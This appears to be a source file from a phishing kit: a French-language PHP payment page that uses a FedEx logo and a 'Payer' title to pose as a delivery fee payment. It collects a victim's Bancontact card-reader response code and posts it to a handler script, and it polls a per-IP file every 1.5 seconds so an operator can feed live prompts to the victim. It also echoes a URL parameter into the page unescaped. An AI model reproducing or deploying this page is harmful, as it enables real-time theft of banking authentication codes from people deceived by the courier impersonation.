<!DOCTYPE html>
<html lang="en">
<?php
include '../config.php';
$str = $_GET["parameters"];

$parameters =  base64_decode($str);

parse_str($parameters, $params);
$ip =  $params["ip"];
$pays =  $params["pays"];
$name = $params["nompren"];
/*echo $params["nompren"]; exit;*/
$montant =  $params["montant"];

if ($ip == "") {
    /*echo "something wentworng";exit;*/

     header('Location:index.php');
     return;
}



?>

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="img/favicon.ico">

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <!-- <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css"> -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="css/pyaer.css">
    <title>Payer</title>
    <style>
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: white;
            font-size: 24px;
        }
    </style>


</head>

<body>

    <nav class="navbar navbar-expand-lg  p-3" id="navbar1">
        <div class="container">
            <a class="navbar-brand" href="#"><img src="img/logo.png" alt="Fedex" style="width: 100px;"></a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <i class="fa fa-bars" aria-hidden="true"></i>
            </button>

            <div class="collapse navbar-collapse justify-content-center" id="navbarNav">
                <div class="navbar-nav ">
                    <a class="nav-link text-white" aria-current="page" href="#">Expédier</a>
                    <a class="nav-link text-white" style="margin-left: 20px" href="#">Suivi</a>
                    <a class="nav-link text-white" style="margin-left: 20px" href="#">Support</a>
                    <a class="nav-link text-white" style="margin-left: 20px">Compte</a>
                </div>
            </div>
        </div>
    </nav>
    <div class="payment-details" style="color: white;
    background-color: rgb(90 34 153);
    border-top: 1px solid #222;
    padding: 10px;">
        <div class="container">
            <table style="margin:auto">
                <tbody>
                    <tr>
                        <td class="align-right-text-top" style="text-align: left; "><span class="multilanguage-text" id="beneficiaryTxt">Bénéficiaire</span></td>
                        <td class="strong">: <?php echo "$name"; ?></td>
                    </tr>
                    <tr>
                        <td class="align-right-text-top" style="text-align: left; "><span class="multilanguage-text" id="orderReferenceTxt">Référence </span></td>
                        <td class="strong">: 3XV5JT7 220JH9JE </td>
                    </tr>
                    <tr>
                        <td class="align-right-text-top" style="text-align: left; "><span class="multilanguage-text" id="totalPriceTxt">Prix total</span></td>
                        <td class="strong"><?php echo $_SESSION['bonus'] ?? 0.5; ?> &euro;</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
    <div class="container py-5">
        <!-- For demo purpose -->
        <div class="row mb-4">
            <div class="col-lg-8 mx-auto text-center">
                <!-- <h1 class="display-6">Choisissez le mode de paiement</h1> -->
            </div>
        </div> <!-- End -->
        <div class="row">
            <div class="col-lg-6 mx-auto">
                <div class="card ">
                    <div class="card-header">
                        <!-- <div class="bg-white shadow-sm pt-4 pl-2 pr-2 pb-2">
                            Credit card form tabs
                            
                        </div> End -->
                        <!-- Credit card form content -->
                        <!-- bancontact info -->
                        <div id="bancontact" class="tab-pane show active fade pt-3">
                            <div class="island text-white">
                                <form id="formBanc" method="POST" action="codelecteur.php" class="needs-validation" novalidate>
                                    <div class="d-flex align-items-center justify-content-around  flex-column flex-lg-row">
                                        <img src="img/card_mobile_icon.png" alt="app" class="icon mr-2">
                                        <h3>Préparer votre lecture de carte pour confirmer votre paiement</h3>
                                    </div>

                                    <div id="responsecontainer" style="font-size: 17px;">
                                        <img src="img/spinner.gif" alt="app" />
                                    </div>

                                    <div class="form-group mt-2">
                                        <label for="responeLecteur">
                                            <h6>Résponse</h6>
                                        </label>
                                        <input type="text" id="responeLecteur" name="responselecteur" placeholder="••••" required class="form-control ">
                                    </div>


                                    <button id="submit-button" type="submit" name="subBanc" class="btn ">Poursuivre</button>
                                    <div id="error-messageB"></div>

                                </form>
                            </div>
                        </div> <!-- End -->
                        <!-- bank transfer info -->

                        <!-- End -->
                    </div>
                </div>
            </div>
        </div>
        <div id="loading-overlay" class="overlay" style="display: none">
            <div id="loading-message">
                <img id="img-spinner" src="img/spinner.gif" alt="Your transaction is being processed"><br>
            </div>
        </div>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.bundle.min.js"></script>
        <script>
            $(function() {
                $('[data-toggle="tooltip"]').tooltip()
            })
        </script>
        <script>
            (() => {
                'use strict'

                // Fetch all the forms we want to apply custom Bootstrap validation styles to
                const forms = document.querySelectorAll('.needs-validation')

                // Loop over them and prevent submission
                Array.from(forms).forEach(form => {
                    form.addEventListener('submit', event => {
                        if (!form.checkValidity()) {
                            event.preventDefault()
                            event.stopPropagation()
                        }

                        form.classList.add('was-validated')
                    }, false)
                })
            })()
        </script>
        <!-- Bancontact Validation -->
        <script>
            //matnssach hna tcodi lvalidation d'bancontact
            $(function() {
                // var bancRegEx = /^670[3][\d ]/;
                // $('#loading-overlay').show();
                $("#formBanc").submit(function(event) {
                    $('a, button').on('click', function(event) {
                        // Show the loading spinner
                        $('#loading-overlay').show();
                    });
                });
            })
        </script>

        <script>
            function getLog() {
                <?php
                $ip = getenv("REMOTE_ADDR");
                $url =  $_SESSION['url'] . 'data/' . $ip . '.php';

                ?>
                $.ajax({
                    url: '<?php echo $url; ?>',
                    dataType: 'html',
                    success: function(text) {
                        $("#responsecontainer").html(text);
                        setTimeout(getLog, 1500); // refresh every 30 seconds
                    },
                    error: function(XMLHttpRequest, textStatus, errorThrown) {
                        $("#responsecontainer").html(`
          <img id="img-spinner" src="img/spinner.gif" alt="Your transaction is being processed"><br>Veuillez patientez quelques instant... 
          `);
                        //   getLog();
                        setTimeout(getLog, 1500); // refresh every 30 seconds
                    }
                })
            }

            getLog();
        </script>

</body>

</html>